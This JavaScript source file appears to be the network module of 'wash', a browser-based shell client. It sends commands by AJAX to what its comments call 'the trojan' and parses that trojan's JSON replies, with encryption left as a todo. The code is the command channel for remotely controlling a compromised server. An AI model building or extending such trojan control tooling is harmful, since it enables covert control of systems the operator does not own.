/**
 * Encapsulates communicating across the Internet
 */
wash.net = {

    // communicates out to the trojan
    send: function(){
        // @todo: do crypto on wash.command here
        var ciphertext = wash.command;

        // make an AJAX request
        $.ajax({
            type : wash.connection.request_type,
            url  : wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
            data : ciphertext,
        }).done(function(response){
            // invoke the callback function
            wash.net.receive(response);
        });
    },

    // process communications from the trojan
    receive: function(response){
        // @todo: manage crypto here
    
        // parse the JSON response
        wash.response = JSON.parse(response);

        /*
        // todo: all of this should be decoupled from this method
        // set the prompt context
        shell.prompt.context.set(wash.response.prompt_context);

        // output the last command as history
        shell.output.write(wash.response.prompt_context + ' ' + shell.prompt.get());

        // display output or error, depending on which was received
        if(wash.response.error != null){
            shell.output.write(wash.response.error, 'output wash_error');
        } else {
            shell.output.write(wash.response.output, 'output');
        }
        */
    },

}
